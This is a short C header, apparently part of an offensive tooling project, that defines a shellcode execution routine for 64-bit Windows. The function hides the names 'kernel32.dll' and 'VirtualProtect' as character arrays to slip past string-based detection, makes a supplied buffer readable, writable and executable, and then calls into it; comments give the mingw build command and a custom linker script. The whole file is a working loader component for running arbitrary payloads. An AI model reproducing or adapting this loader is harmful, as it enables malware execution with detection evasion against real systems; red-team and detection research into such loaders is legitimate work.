//make sure to use the custom linker defined in source/implementations/linkers/exec_shellcode64_no_winapi.ld
//x86_64-w64-mingw32-gcc -o output.exe input.c -Wl,--script=../implementations/linkers/exec_shellcode64_no_winapi.ld
#pragma once

//#include "../debug_print/debug_print.h"

// Function to copy shellcode and execute it
void exec_shellcode64_no_winapi(unsigned char *shellcode, int shellcode_size, char *payload_info)
{
    DWORD oldProtect;
    BOOL result;

    const char kernel32_dll[] = {'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0};

    HMODULE hKernel32 = GetModuleHandle(kernel32_dll);

    const char virtual_protect[] = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0};

    FARPROC pVirtualProtect = GetProcAddress(hKernel32, virtual_protect);

    // Call the VirtualProtect function using the function pointer
    result = ((BOOL (WINAPI *)(LPVOID, SIZE_T, DWORD, PDWORD))pVirtualProtect)(
        shellcode, shellcode_size, PAGE_EXECUTE_READWRITE, &oldProtect);

    (* (int(*)()) shellcode)();
}